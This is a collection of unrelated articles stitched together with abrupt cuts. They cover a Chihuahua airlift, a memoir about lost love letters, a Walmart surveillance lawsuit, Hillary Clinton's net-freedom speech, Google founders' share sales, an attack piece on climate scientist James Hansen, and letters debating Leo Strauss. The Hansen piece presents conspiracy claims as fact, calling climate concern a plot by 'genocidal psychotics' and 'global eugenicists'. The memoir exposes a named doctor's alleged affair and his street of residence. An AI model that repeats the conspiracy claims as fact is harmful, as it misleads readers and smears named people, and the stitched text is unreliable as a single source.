Yet since arriving at the East Side shelter , the 15 Chihuahuas  Jeb , Orlando , Bella , Colette , the aforementioned Malibu , Annie , Bebop , C. J. , Nala , Sherlock , Hancock , Honey , Tina , Holly and Maximus  have been adjusting to life in the big city .
Some of them are living in fourth - floor condos ( that ’s what the A.S.P.C.A. calls its deluxe , glass - walled rooms ) , listening to classical music that is piped in and enjoying three walks outside and two feedings a day .
California , it turns out , has too many Chihuahuas .
New York City does not have enough .
So animal welfare officials in San Francisco and Manhattan arranged for what a Virgin America press release dubbed a “ Chihuahua airlift ”  15 homeless dogs from the Bay Area were flown to Kennedy by the airline so they could be adopted by New Yorkers .
It has been no small feat .
The A.S.P.C.A. estimated that it would spend $ 100 to $ 2,000 per dog for spaying and neutering , shots , food , housing , veterinary care and other costs .
At least one dog will undergo orthopedic surgery .
Virgin America donated roughly $ 12,000 in travel costs for the dogs and their human companions .
None of the 15 Chihuahuas were at risk of being euthanized ( no adoptable cats or dogs are put to death in San Francisco , only those with severe behavioral or health issues ) .
The Chihuahuas will be given behavioral as well as medical assessments , and a number of them will be available for public viewing and adoption on Wednesday at noon .
“ We expect them to take a little bit of time to adjust to the New York sights and sounds , ” said Arthur Hazlewood , senior director of the Adoption Center .

Though this has long been a small - dog city ( because it is a small - apartment city ) , the Chihuahua has never quite symbolized New York .
“ Beverly Hills Chihuahua , ” the 2008 movie , has a certain ring to it that , say , “ Brooklyn Chihuahua ” lacks .
Yet the breed has quietly earned a reputation as one of the most popular in the city .
Revealed :
The love letter - writing beauty who left her heart on a bus
It was a tantalising mystery : who left a bundle of anonymous love letters on the back seat of a coach ?
Only now can the captivating answer finally be revealed .
The face that smiled teasingly up at me from a page in a newspaper last month sent me spinning back 46 years .
' Who 's that girl ? ' demanded the headline .
But I knew instantly who she was before I 'd even read about the mystery that had arisen concerning her .
I knew because she had played a crucial role in my life .
She was not only the most beautiful creature I ever saw , and the first girl I fell in love with ; she was also the glamorous and fascinating catalyst who introduced me to the London of the Swinging Sixties .
Enigmatic : A photo of a young Anna Paton found at a bus station in Bristol
How could I forget her ?
For more than 40 years I had wondered what had become of her , and had made several unsuccessful attempts to trace her .
Now , through a moment of absent - mindedness and a piece of lost property , she had suddenly become headline news .
The mystery began in the summer of 2008 when a purple plastic bag , left on the back seat of a coach that terminated in Bristol , was found to contain more than 70 black and white photographs of a beautiful , dark - haired young woman .
With them was a large bundle of passionate and sometimes poetic love letters , written between 1963 and 1974 to a Miss Anna Paton at addresses in Knightsbridge and Chelsea in London , Barcelona in Spain , Capetown in South Africa , Sydney in Australia , Antibes in France , and Lisbon in Portugal .
Many of the letters were tied together with pink ribbon .
There were love notes that must have been sent with bouquets of flowers , and several handwritten poems .
The letters all began romantically , ' To my love ' , and were signed , ' God bless you my darling , my lover .
X ' .
One two - page poem was headed , in Elizabethan style , The Lover 's Complaynt On his Evident Incapacity To Fulfil His Mistress Her Task ' :
Simply to gratify my Anna's
curious pleasure
Is it really honest to loot poor grave's
golden treasuries ?
T'will be the only pinching I am likely
to be allowed
Unless
I goose her secretly in the middle
of a crowd .
FirstGroup plc , the company which operated the coach on which they were found , logged the plastic bag and its contents , which was kept for one month .
No one came forward to claim it .
Staff wrote to the addresses on the letters .
No one responded .
Finally , after 18 months of silence , the company released details and photographs to the media in a bid to trace the elusive owner .
Anna Paton was always mysterious and secretive .
I vividly recall the first time I ever saw her .
Lost mementos : Letters to and photographs of the mysterious Anna Paton
It was 1964 .

Street who needs an adult to accompany him into an A - feature ' .
I was urgently in search of a central London flat .
A girl whom I knew told me : ' There 's a great pad going near Harrods .
But you 'll be lucky to get it - there are already more than 30 people after it . '
Anna was the most beautiful creature I 'd seen
The address was 10 Aubrey House , 13 Basil Street , Knightsbridge .
I rang the bell and a clear , light voice said : ' Come up . '
The door was opened by a radiant and devastating creature who looked as if she had stepped straight out of a painting by Goya or Degas .
A cloud of raven hair with streaks of reddish - gold in it framed a face of extraordinary delicacy , with the bluest of eyes and a mouth that seemed somehow to be laughing at the world .
She strongly resembled the young Audrey Hepburn as Holly Golightly in Breakfast At Tiffany's ; but there was also an air of cool composure that recalled Vivien Leigh , at the height of her beauty , as Scarlett O'Hara .
Everything about Anna betokened a striving for perfection .
The clothes were expensive , in perfect taste , and worn with unconscious style .
Clues : Anna with perhaps her mysterious lover Xavier in a foreign city
She was , at a glance , what used to be known as ' a knockout ' , and had what is now described as ' the wow factor ' .
I stood in the doorway silent and transfixed .
Something in her expression suggested that this was a reaction to which she was quite accustomed .
She gave a little laugh and said : ' Well , do come in . '
And I entered a room that seemed to have been designed as her personal stage set .
It was small , but exquisitely furnished - by herself - with the use of bold , dramatic colours .
They became , quite literally , besotted with each other , and began an affair of extraordinary intensity
The cushions were in unusual shades of ochre , yellow chartreuse and lime green .
Instantly I saw myself living there .
She was watching my face with amusement .
' You like it then ? ' she inquired .
' Oh yes , ' I replied .
' But I am told there are a lot of people ahead of me . '
' Yes , ' she conceded , ' but I want to find someone who suits the flat .
You see , this place is very special to me .
I fell in love here . '
She looked at me appraisingly and said : ' You 'll do , I think . '
She handed me a card and said : ' Come to that address tomorrow and you can pick up the keys . '
The following evening , I presented myself at her studio in the King 's Road , in a block almost opposite Chelsea Town Hall .
She came to the door with a paint brush in her hand .
Even in an artist 's smock , she still managed to look utterly sensational .
I looked at her paintings .
Each one was executed with the same dramatic use of colour as my new apartment .
Style : Anna , who enjoyed art while living in London , poses in two portrait photos
The latest painting , standing on her easel , showed a young woman with a cloud of dark hair and a faraway expression in her eyes .
She looked like someone with a secret ; enigmatic and elusive .
She dismissed my compliments about her work .
' I paint for love , ' she said , ' not for ambition .
It 's important to love .
It does n't matter who or what , so long as you love . '
The adorable Anna opened doors for me into the heady world of London high life .
My near neighbours in Basil Street included two Beatles , Paul McCartney and George Harrison , as well as their Svengali , Brian Epstein .
Two streets away , the notorious Kray Twins , Ronnie and Reggie , ran their nightclub , Esmeralda 's Barn , of which I became an habitue .
And around the corner in Hans Crescent lived the fabulously rich and eccentric Guinness heiress , Maureen , Marchioness of Dufferin and Ava , who , when she was n't showing me Princess Margaret 's private letters over lashings of champagne , would perform hilarious impersonations of the prostitutes who had appeared in court before her third husband , Judge John Maude .
This was the high society world in which Anna moved , and in which my callow infatuation with her stood no chance at all .
Michael Thornton : Anna 's ex-flatmate
She had a bevy of ardent male admirers , but seemed to hold them all at arm 's length .
One , Sir Winston Churchill 's son-in - law , the cabinet minister Duncan Sandys ( who counted the legendary Margaret , Duchess of Argyll among his conquests ) told me that Anna was the most beautiful woman he had ever seen .
Another , an inordinately rich peer of the realm , not usually noted for his interest in women , assured me : ' I 'd lay down my coronet for her tomorrow if only she would give me a second glance . '
But Anna had eyes for only one man - a man with whom she had fallen deeply but disastrously in love .
He was a young Spanish doctor , Xavier Pi-Sunyer , born in Barcelona but educated and trained in the United States .
Both were 29 when they met while he was working as a junior registrar at St Bartholomew 's Hospital in London .
They became , quite literally , besotted with each other , and began an affair of extraordinary intensity .
He was six feet tall , with dark Latin looks and a moustache .
Anna adored him .
She had found the man with whom she wished to spend the rest of her life .
But it was never to be .
For Xavier was married to a young American girl , Penelope Wheeler , from a wealthy family in Cambridge , Massachusetts .
And being a Roman Catholic , not even his overpowering passion for Anna could persuade him to divorce his wife and abandon their three daughters - one of whom , Olivia Pi-Sunyer , became the writer and director of the 2000 Hollywood film , Something Sweet , starring award - winning actor Daniel J. Travanti .
Anna , born Muriel Mayklim Jackson in Australia in 1933 to a well - to - do family with Scottish ancestry , had been married herself , in 1953 , to a young Australian , Peter Heath - an event chronicled on the society pages of the Melbourne newspapers .
But the marriage was short - lived , and in 1956 she changed her name by deed poll to Muriel Mayklim Paton , before moving to London , where Muriel Paton became Anna Paton .
It is touching that 34 years after their last known communication , she was still carrying the treasured mementoes of their love affair with her on a coach trip
In 1963 , Xavier Pi-Sunyer left Britain to work as visiting lecturer in medicine and preventive medicine at the University of Ibadan in Nigeria , and it was now , while they were parted , that his love letters to Anna began .
From Nigeria , he wrote to ' Darling Anna ' : ' I think so much of you and feel you 're very close to me these thousands of miles away ' .
He ends : ' I love you .
Xavier ' .
In 1967 , after a family holiday , he writes to his mistress : ' My love , I missed you so during my holiday .
‘ We went to Cyprus , where there was that lovely purple sea , swaying trees and softness in the landscape , and a marvellous luminous light in the evening which is such a feature of the eastern Mediterranean islands .
Be well and I may be happy .
I love you .

After two years as Anna 's tenant , I moved to a larger flat in Bryanston Mews East , where my next - door neighbour was Mick Jagger .
Life there was not peaceful , as the Mews was besieged daily by Jagger 's aggressive teenage female fans .
Anna chortled with delight when she heard this .
' I told you that you should have stayed in my little flat , ' she said .
I was to see Anna only once more , quite unexpectedly , several years later , in St Ives , Cornwall , where my aunt had a house .
There , on a windy spring day , with the gulls circling and shrieking above us , I turned and was astonished to find myself face - to - face with my former London landlady .
Anna was still beautiful , still elegant , still stylish .
' Whatever are you doing here ? ' I said .
' Painting , ' she said .
' I have a studio near the beach at Porthgwidden .
I grew tired of London .
I love it here .'
Extracts of the globe - trotting letters
On 9 October 1963 , Xavier wrote on letter headed paper from University College , Ibadan , Nigeria , to express his sadness at Anna ’s grandfather ’s death .
‘ Darling Anna .
I heard just before I left about your grandfather and felt very sad not to have been there to help you .
‘ I do hope you ’re all right and that you can be happy for him that he did n’t linger on but I know that you loved him very much , as he loved you .
‘ Tell your mother and grandmother that I hope they too will not be too upset by these last weeks and that I prey for you all .
‘ I think so much of you and feel you ’re very close to me these thousands of miles away .
‘ This is a sad and terrible country but I came to the people here and really wish I could do something for them .
I suppose the best I can do is to let as many of them pass their examinations and become doctors as I possibly can .
‘ God bless you - I wish I could have a little hand from you my love but it is quite likely that this reach get to you before I get back myself .
I love you .
Xavier .’
Four years later Xavier wrote to her from London on 19 October 1967 , while she was in Sydney .
‘ My love I missed you so during my holiday .
We went to Cyprus where there was that lovely purple sea , swaying trees and softness in the landscape , and a marvellous luminous light in the evening which is such a feature of the eastern Mediterranean islands .
‘ We just got back and I got your letter at the hospital today .
I feel sad that you had such a reaction after your case but can only hope that you have gotten over it now .
‘ I am back to the holiday rush of work now but it is for you my love as always .
Be well and I may be happy .
I love you .
X. ’
Within the bundle there was also a newspaper clipping from an Australian newspaper in 1968 , with the headline : ‘ Scientists work on ways to beat death ’ .
I had never met Xavier .
She had never once mentioned his name , but I knew she was involved with a married man , and that their relationship meant everything to her .
' Is it still the same ? '
I asked , and she knew immediately what I meant .
' Yes , it is still the same , ' she said , ' and it always will be . '
And that was the last I saw of her , with her hair blowing in the sea breeze , turning back to laugh and to wave to me .
And then she vanished from my life , and also from the lives of many of those who had known her .
Xavier 's career now became based in New York , where he was head of endocrinology and diabetes at St Luke 's - Roosevelt Hospital Centre .
His love letters to Anna - at least , those discovered in the purple plastic bag - end in 1974 .
There is something infinitely poignant and touching that 34 years after their last known communication , she was still carrying the treasured mementoes of their love affair with her on a coach trip .
But when the coach ended its journey in Bristol , Anna left the purple plastic bag containing Xavier 's letters , and the photographs of them together , behind on the back seat .
And so the passionate love affair that both had struggled to conceal for so many years became known at last to the media and to the public .
Professor Xavier Pi-Sunyer , 76 , is today one of the most distinguished and respected doctors in the world , and a leading international authority on clinical nutrition , diabetes and obesity .
He and his wife Penelope now live in an apartment on West End Avenue , Manhattan .
Both have been generous donors to the Democratic Party in recent years .
Yet clearly mindful of the effect on his wife of the publication of his youthful affair , Xavier Pi- Sunyer denied that he is the Xavier who wrote the love letters when contacted a few weeks ago .
He claimed never to have heard of Anna and even denied working in Nigeria at the same time that the letters were written .
However , his own published CV makes clear that he was there at the University of Ibadan in October 1963 , when the first letter ( on the university 's headed notepaper ) was written to Anna .
Anna Paton , on seeing her photographs and her lover 's letters published in the media , instructed a solicitor to contact FirstGroup plc on her behalf to arrange for the return of her property .
She would neither see nor talk to any representative of the coach company , nor give interviews , nor reveal where she is living .
But the purple plastic bag , with its evidence of Xavier Pi-Sunyer 's love for her , has now been returned to her .
None of this surprises me .
Anna was perhaps the most elusive and enigmatic person I have encountered in all my long career in journalism .
Being confronted , in old age , with the world - wide publication of a very private relationship , and with its doomed finale when the love of her life chose to stay with his wife and children , must have been a devastating experience .
Yet even now , for me , she retains her fascination .
Albert Einstein once observed : ' The most beautiful thing we can experience is the mysterious . '
Anna Paton , like the tantalising smile on the face of the Mona Lisa , has kept her mystery to the very last .
Seven former and current Walmart employees are suing the retail giant after one of its Pennsylvania stores installed a surveillance camera in a unisex bathroom used by employees and customers , according to ABC News .
The camera was allegedly installed by two employees in the company 's loss - prevention department , with the aim of monitoring employees for theft .
They installed the device in a bathroom–dressing room in the Tire and Lube center of a Walmart Supercenter in Easton , Pennsylvania .
Workers discovered the camera in March 2008 .
It 's not known how long the camera was recording activity in the bathroom before it was found .
Walmart fired two employees who were responsible for installing the camera , according to a statement it provided ABC News .
The suit also names four local Walmart managers .
The attorney representing the plaintiffs says three of the employees were dismissed from their jobs after complaining about the camera .
It 's not the first time a company has been caught videotaping employee bathrooms .
Workers at Consolidated Freightways discovered in 1997 that the trucking company had concealed surveillance cameras behind the mirrors in worker bathrooms in California .
The company claimed it was trying to catch employees selling or using illegal drugs , and that the cameras were not aimed at the urinals or bathroom stalls .
Workers at the Sheraton Boston Hotel and Tower discovered in 1991 that their employer had been videotaping them in an employee locker room .
State laws vary on whether companies need to notify workers in advance that they 're being monitored .
Laws also vary on what kinds of surveillance companies can do .
Some states explicitly prohibit the installation of cameras in bathrooms , changing rooms and other areas where people have a reasonable expectation of privacy .
But even without an explicit law prohibiting such monitoring , state tort laws can be invoked to protect the privacy of employees in cases where there is an expectation of privacy .

This tip was submitted by an anonymous visitor to our website .
It was almost too easy .
In a major speech today on net freedom , Secretary of State Hillary Clinton reached back to Winston Churchill – and to Ronald Reagan – in arguing for a future in which access to networks and information is a basic human right .
In a deliberate reference to Churchill 's 1946 " iron curtain " speech , Clinton warned that " a new information curtain is descending across much of the world , " even as network technology spreads .
And she echoed Reagan 's 1987 challenge to Soviet Premier Mikhail Gorbachev , as she called for governments to lift the electronic barriers to communication .
" Virtual walls , " she said .
" are cropping up in place of visible walls . "
Clinton 's speech , in many ways , was a 21st - century remix of an Cold War theme , comparing internet censorship in countries like China , Uzbekistan and Vietnam to Soviet - style restrictions on press freedom .
In the most direct analogy , she described web 2.0 tools like YouTube , Facebook and Twitter as the " samizdat of our day . "
In Iran , for instance , grainy video footage of the death of Neda Agha - Soltan during pro-democracy demonstrations quickly went viral .
Clinton said such footage served as a " digital indictment " of the regime in Tehran .
Clinton spoke of reinvigorating the State Department 's Global Internet Freedom Task Force as forum for addressing threats to net freedom .
But Clinton also had a message for companies ( * cough * Google ) that want to do business with countries that restrict digital freedom .
" We are urging U.S. media companies to take a proactive role in challenging foreign governments ' demands for censorship and surveillance , " she said .
" The private sector has a shared responsibility to help safeguard freedom of expression .
And when their business dealings threaten to undermine those freedoms , they need to consider what 's right – not what 's simply a quick profit . "
A snarky aside :
The failed Sovietologist in me was glad to see Clinton dust off a word like samizdat ( самиздат , literally : " self - publishing " ) .
But seriously , the State Department needs to do something about its Russian skills .
First they screwed up the translation of the " reset " button presented as a gag gift to Russian Foreign Minister Sergei Lavrov .
This time , whoever was spelled out the word phonetically for Clinton got it wrong :
It 's " sam-is - DOT , " not " some - EASE - dot . "

Larry Page and Sergey Brin , the two billionaire co-founders of Google , will each sell 5 million of their Google shares over the next five years , according to an SEC filing .
Because Page and Brin are significant shareholders and executives for the technology giant , they are required to report their transaction plans for their piece of the company they founded over a decade ago .
Currently the two men own approximately 57.7 million shares of Google — about 18 % of Google 's market value and 59 % of the voting power .
After the five - year plan is complete , they will own around 47.7 million shares , dropping their interest in Google to around 15 % of its capital stock and 48 % of its voting power .
This equates to a transaction of $ 2.25 billion , based on the current value of a share of Google , $ 550.01 .
Yes , this technically means that the two co-founders are surrendering their absolute voting control of the company , but it 's incredibly hard to see a situation where every other investor and shareholder in the company would vote against their wishes .
In other words , the drop in their voting power is not a big deal .
Why would the founders sell their shares of Google , especially as the stock has risen dramatically in recent years ?
The answer is diversification , one of the most prudent and practical moves in investing .
It 's the same thing that Bill Gates has done for years in order to diversify his profile and give him the flexibility to invest in other endeavors , such as his foundation .
In fact , the founders have done something similar before , back in 2004 .
Larry and Sergey are n't leaving anytime soon , nor are they going to be outvoted by anybody in the foreseeable future .
They just wanted more flexibility with their money .
$ 2.25 billion can buy a lot of things , you know .

Prominent NASA global warming alarmist Dr. James Hansen has endorsed an eco-fascist book that calls for cities to be razed to the ground , industrial civilization to be destroyed and genocidal population reduction measures to be implemented in the name of preventing climate change .
Hansen , who was back in the news today commenting on a NASA press release that claims the last decade was the warmest on record , said that Keith Farnish , author of a new book called Time ’s Up , is correct in calling for acts of sabotage and environmental terrorism in blowing up dams and demolishing cities in order to return the planet to the agrarian age .
Hansen is a key figure in the global warming movement , for it was his 1988 with testimony to a US Senate committee chaired by Al Gore that really got the ball rolling for the elite in their mission to hijack the environmental movement and promote apocalyptic fears of climate change as a means of seizing absolute power over humanity .
Author Farnish “ believes – as the Hon Sir Jonathon Porritt does – that mankind is a blot on the landscape and that breeding ( or for that matter , existence ) should be discouraged , ” writes James Delingpole .
“ The only way to prevent global ecological collapse and thus ensure the survival of humanity is to rid the world of Industrial Civilization , ” writes Farnish , adding that “ people will die in huge numbers when civilization collapses ” .
Farnish echoes similar talking points to those featured in White House science czar John Holdren ’s Ecoscience textbook , which called for a “ planetary regime ” to carry out forced abortions and mandatory sterilization procedures , as well as drugging the water supply , in an effort to cull the human surplus .
Farnish explains his desire to see rampant population reduction in the name of saving the planet .
“ In short , the greatest immediate risk to the population living in the conditions created by Industrial Civilization is the population itself .
Civilization has created the perfect conditions for a terrible tragedy on the kind of scale never seen before in the history of humanity .
That is one reason for there to be fewer people , ” he writes .
And how is the collapse of industrial civilization to be achieved ?
By indiscriminate acts of sabotage and eco-terrorism .

“ Unloading essentially means the removal of an existing burden : for instance , removing grazing domesticated animals , razing cities to the ground , blowing up dams and switching off the greenhouse gas emissions machine .
The process of ecological unloading is an accumulation of many of the things I have already explained in this chapter , along with an ( almost certainly necessary ) element of sabotage , ” writes Farnish .
But surely the respected and authoritative individuals we have been told by the media to trust when it comes to the science behind global warming would rebuke such outlandish , deranged and extreme methods of addressing climate change ?
“ Keith Farnish has it right : time has practically run out , and the ’ system ’ is the problem , ” wrote Dr. James Hansen on the Amazon website .
“ Governments are under the thumb of fossil fuel special interests – they will not look after our and the planet ’s well - being until we force them to do so , and that is going to require enormous effort .
It has also come to light that Hansen was n’t even asked to comment on Farnish ’s book , he freely volunteered his opinion .
“ Just to put the quote into context , it was indeed spontaneous from James and surprised me a little at first , ” wrote author Farnish on the Yahoo Answers website .
“ It ’s an important thing to remember when we talk about AGW : many of the activist - scientists pushing it passionately want the earth to be getting hotter and it for it to be largely man ’s fault .
These watermelons certainly do n’t want the opposite to be true , because then they would n’t have the excuse they so desperately need to destroy the capitalist system and take us all back to the agrarian age , ” comments Delingpole .
The entire climate change takeover is being spearheaded by self - hating psychotics who want to impose a global one child policy in the name of curbing overpopulation .
As we have vehemently proven , the overpopulation hype is a debunked myth with no basis in reality .
The real reason global eugenicists want to implement such policies , along with taxing the life - giving gas carbon dioxide , is because it would give them absolute control over every single aspect of our lives – a control freak ’s utopia .
The propagandistic method of depicting humans as the enemy is perfectly tailored to this agenda , because it elicits the response of making people call for their own kind to be regulated , controlled , and even killed under the contrived pretext of preventing an ecological apocalypse .
This approach was again evident in a recent United Nations sponsored poster campaign which depicted humans as evil horror movie monsters intent on slaughtering wildlife and killing the earth .
The global elite resolved to take this approach back in 1991 when the Club of Rome , a powerful globalist NGO committed to limiting growth and ushering in a post - industrial society , said in their report , The First Global Revolution , “ In searching for a new enemy to unite us , we came up with the idea that pollution , the threat of global warming , water shortages , famine and the like would fit the bill … .
All these dangers are caused by human intervention …
The real enemy , then , is humanity itself . ”
Genocidal psychotics are now trying to obtain the power to carry out the kind of nihilistic blueprint for terror Farnish outlines in his book in pursuit of their “ post - industrial society ” .
What makes it all the more galling is that these eco-fascists present their lunacy in such a reasonable and sober tone .
In reality , although they try to characterize humanity as a virus upon the planet , the only real cancer upon the earth is their virulently neo -fascist doctrine of warped environmentalism and population control .
The only real threat to humanity ’s survival is not climate change , which has naturally occurred for eons since the very incarnation of planet earth , but the insane , self - destructive and monstrous plans to “ solve ” the issue being proposed by eco-fascists like Farnish and endorsed by people in prominent positions of influence like Hansen .

Sphinx Without a Secret from the May 30 , 1985 issue
To the Editors :
M.F. Burnyeat ’s review of Leo Strauss ’s Studies in Platonic Political Philosophy [ NYR , May 30 ] bears the same relation to Mr. Strauss ’s thought that the accompanying caricature bears to Strauss ’s person .
Whoever knows or knew the original must be offended by a travesty generated apparently between levity and a gift for deforming the normal .
By his deed Mr. Burnyeat vindicates what in words he denounces , namely , Strauss ’s view that a serious thought needs to be veiled against ill - natured levity , and Strauss ’s insistence that the student ( a fortiori the critic ) take the trouble to grasp the author ’s meaning , i.e. to understand him as he understood himself , before undertaking to discuss that author ’s work .
By the method of parading elaborated reflections as adages jejune and assertoric , Mr. Burnyeat holds them up to ridicule , as he does Mr. Strauss ’s references to gentlemen and philosophers , unworthily lampooning those words by putting them in quotation marks as if they cannot be used without the apology implicit in that tendentious punctuation .
The advice that a reader of a worthy ( indeed of any ) writing start by clearing his mind of resistance to the author ’s purpose is generally reasonable and fair , is obviously repugnant to the principles that guide Mr. Burnyeat ’s critical activity , and certainly has nothing to do with the abandoning of self into which Mr. Burnyeat translates it .
That objection can safely be left to collapse by itself .
Mr. Burnyeat deduces Mr. Strauss ’s influence from the physical presence of the latter before his students in the classroom — a tacit appeal to the hypothesis of charisma voiced some time ago .
One knows that Strauss ’s books have little influence because “ Strauss has no discernible influence in Britain at all . ”
But books and articles by Strauss have appeared in Polish , Serbo - Croat , Italian , French , Spanish and of course German , both before and since his death .
Report used to be made of the British headline : “ Storm in Channel : Continent Isolated . ” Mr. Burnyeat does nothing to dispel a presumption that the report is apocryphal .
In any case , however correct he may be in assessing Strauss ’s influence in Britain , nothing may be concluded about Strauss or Britain in the absence of another premise for the syllogism .
Mr. Burnyeat weakens his depreciation of Strauss by providing a quite remarkable demonstration , albeit offered as a mockery , of what Burnyeat might be capable of were he to restrain his ill - will from hindering his judgment .
In the last half dozen paragraphs of his section 3 , he affects to expose the mechanical simplicity of the Straussian hermeneutic : “ You start , always , by taking note of the arrangement of the work . ”
Mr. Burnyeat is out to show what a simple thing it is to anatomize the organization of a book , and incidentally how useless is the product .
Instead , he shows how difficult it is , how well he was himself compelled to think about the contents in their relation to the author ’s intention , and how helpful to his — and our — understanding of Strauss ’s purpose is the fruit of his derisive effort .
Without having been exposed to Mr. Strauss ’s charisma , Mr. Burnyeat has been induced to afford his own evidence of the plausibility of a Straussian advice — try to understand a book as the author meant it .
( Would Mr. Burnyeat ’s intended satire have been amusing , to say nothing of useful , if someone had n’t let him know that the order of chapters originated with Strauss and not with some editor ? )
This would be a thoughtless and in one more respect an incomplete response to Burnyeat ’s regrettable article if it failed to try to understand Burnyeat as he might understand himself .
Without a great deal to go on — and I know how much that confession subtracts — I surmise that he is uncritically devoted to the intellectually received and the academically authenticated , perhaps because there must indeed be something valid in what has earned the cachet of professionals , and perhaps because there is safety in numbers .
His objections to Strauss are not new , as he admits , and in fact are the tediously familiar budget of recriminations coming from a conventional establishment , which is as precisian in scrutinizing the orthodoxy of “ rebarbatives ” as any coven of philistines sniffing out a bohemian .
It can never do Straussians any harm to look within under the stimulation of such a rebuke as Mr. Burnyeat ’s .
One could wish that the critics would treat themselves occasionally to the same purification .
Joseph Cropsey
University of Chicago
Chicago , Illinois
To the Editors :
I would like , if I may , to comment on M.F. Burnyeat ’s review of Studies in Platonic Political Philosophy , by Leo Strauss .
Burnyeat ’s opinion of Strauss was sufficiently indicated by the cartoonist , who gave Strauss two right hands — neither of which , one presumes , knew what the other was doing .
Burnyeat declares that “ There is no doubt that Strauss was an inspiring teacher . ”
But Burnyeat can find nothing in Strauss ’s writings — which he calls “ remote and rebarbative ” — to explain Strauss ’s extraordinary influence on nearly everyone who came into contact with him .
What went on in Strauss ’s classes was remarkable and powerful , but as far as Burnyeat is concerned , it remains utterly mysterious .
This is neither the time nor the place for me to offer my own critique of Strauss ’s work .
It is a subject on which I have written with increasing frequency since Strauss ’s death .
( See for example “ The Legacy of Leo Strauss , ” Claremont Review of Books , Fall 1984 , and “ The Legacy of Leo Strauss ’ Defended , ” Ibid. , Spring 1985 . )
I would like , however , to offer a few words of personal testimony as to how Strauss differed in my experience from other teachers , and why so many sat so spellbound in his classes .
I might mention that I took my first course with Strauss in the fall of 1944 .
For the next seven years , in both New York and Chicago , I attended virtually every class he taught , including those in summer sessions .
During this period I believe I spent nearly as much time alone with him as in class .
But whether in class or alone , every minute was a vital learning experience .
Today , I return again and again to his writings .
Contrary to Burnyeat , Strauss was a great writer , and his works abound with passages of eloquence and beauty .
But he always warned us , when writing , not to sacrifice precision of meaning for mere effect .
My own books , particularly my writings on Lincoln , are often outgrowths of conversations I originally had with Strauss .
In the Preface to the 1982 reprinting ( by the University of Chicago Press ) of Crisis of the House Divided , my book on the Lincoln–Douglas debates ( first published in 1959 ) , I wrote that the work had been born in my mind
When I discovered — at a time when I was studying the Republic with Leo Strauss — that the issue between Lincoln and Douglas was in substance , and very nearly in form , identical with the issue between Socrates and Thrasymachus .
Douglas ’s doctrine of “ popular sovereignty ” meant no more than that : in a democracy justice is the interest of the majority , which is “ the stronger . ”
Lincoln , however , insisted that the case for popular government depended upon a standard of right and wrong independent of mere opinion and one which was not justified merely by the counting of heads .
Lincoln once described the central proposition of the Declaration of Independence — to which , at Gettysburg , he said the nation at its birth had been dedicated — as “ an abstract truth , applicable to all men and all times . ”
This is a perfect example of what Leo Strauss meant by natural right .
And Strauss believed — as did Lincoln — that it was possible to have sufficient knowledge of natural right to guide our lives , in the decisive respects , both individually and politically .
Lincoln once declared that he had “ never had a feeling politically that did not spring from the sentiments embodied in the Declaration of Independence . ”
For Lincoln , the Declaration was a timeless source of political wisdom .
It was a source of such wisdom for the American people as much as were the tablets of the law brought down by Moses from Sinai for the children of Israel .
If we however turn to Carl Becker ’s The Declaration of Independence , a book perfectly characteristic of non-Straussian scholarship in political philosophy , we find the following :
To ask whether the natural rights philosophy of the Declaration of Independence is true or false is essentially a meaningless question .
What Becker meant — and he spoke for nearly every historian and social scientist of our time — was that to ask what is just or unjust , right or wrong , is a “ value judgment , ” and as such “ subjective ” and not susceptible to rational analysis , which can deal only with “ facts . ”
Before I met Strauss this is what I had been taught , and had never been given any reason to question .
I had spent five years at Yale in the 1930s , as undergraduate and graduate student , where no one , so far as I knew , had ever doubted this orthodoxy .
To study the Declaration of Independence — or Plato ’s Republic — meant to study the “ climate of opinion , ” “ the spirit of the times , ” the “ weltanschauung ” out of which the work came .
Strauss however declared that we must understand the great works of the human mind as their authors understood them , before we try to understand them differently or better ( although — contrary to Burnyeat — Strauss never hesitated to make such judgments when he believed he had sufficient grounds for doing so ) .
None of the great writers of the past had believed , either in the fact - value distinction , or in the historicist fallacy that the genesis of an idea was the key to the truth about it .
Lincoln ’s reading of the Declaration — as embodying an eternal , and eternally applicable truth — was precisely the kind of reading that I had learned from Strauss .
Thus Strauss taught me to read with ever growing wonder and gratitude , both Lincoln and the tradition of political philosophy within which Lincoln had his life and being .
It is difficult to convey to anyone who has not shared such an experience the excitement I felt — now nearly forty years ago — when I realized that I had been emancipated from the dungeon of historicism , from that dark place of the soul in which the great questions , the only questions that make life ultimately worth living , are treated as “ essentially meaningless . ”
That excitement has however never left me , and I can have only pity for those — like Professor Burnyeat — who seem likely never to know it .

To the Editors :
M.F. Burnyeat ’s attempt to wake a sleeping America to the political threat posed to it by the late Leo Strauss is McCarthyite in the precise sense of the term .
His calumny culminates in disgraceful innuendo about Carnes Lord , whose service on the National Security Council staff he takes as evidence of lack of scholarly integrity .
With standard paranoid logic , Burnyeat concludes that this corrupt “ pupil of a pupil ” is proof that Strauss intentionally distorted classical texts as part of a political conspiracy .
Contempt is the only appropriate response to such an ugly project of arousing political passion against the legacy of a serious thinker .
It is worthy of note that Burnyeat ’s attack on Strauss follows hard on the heels of a similarly malicious one from the other extreme of the political spectrum ( “ Is Conservatism Un- American ? ” National Review , March 22 , 1985 ) .
Its title indicates the kind of suspicion it casts on “ Straussians . ”
This union of Far Right and Far Left in enmity to Strauss and his influence should encourage those who incline to think that truth and democracy reside somewhere near the center to have another look at the writings of Leo Strauss .

To the Editors :
In his polemic against Leo Strauss , Professor Myles Burnyeat inadvertently confirms the interpretive standpoint which he labors to discredit .
Strauss ’ reading of Plato probed beyond the surface impression to a deeper meaning — an exercise which Burnyeat paradoxically dismisses as an “ insult to the critical intelligence . ”
For instance , early in the Republic Socrates attacks the equation of justice with the helping of one ’s friends and the harming of one ’s enemies , and Burnyeat ridicules Strauss ’ suggestion that the dialogue thereafter preserves this apparently refuted definition .
Similarly , Strauss ’ perplexity about the absence of any philosophic reason for the philosophers to rule draws from Burnyeat the response that they will wish to requite the debt they owe the ideal city for providing them with their education .
But under what definition of justice is public education to be repaid through public service ?
Surely this reciprocation of benefit for benefit falls under the principle of helping one ’s friends , which thus remains decisive despite Socrates ’ earlier criticism .
What Burnyeat ridicules in one paragraph he requires in another .
Burnyeat ’s observation that “ Strauss turns upside down the meaning of the Republic ” incorporates an innocently dogmatic assumption about “ the meaning ” of a Platonic text .
The Phaedrus and the Seventh Letter indicate that Plato himself did not share this assumption .
Of course , Burnyeat can point to what is explicit in Plato ’s text .
But the significance of the explicit is precisely what Strauss has put at issue .
A thoughtful assessment of the strengths and weaknesses of Strauss ’ work by a scholar of Burnyeat ’s stature and acumen is an urgent desideratum .
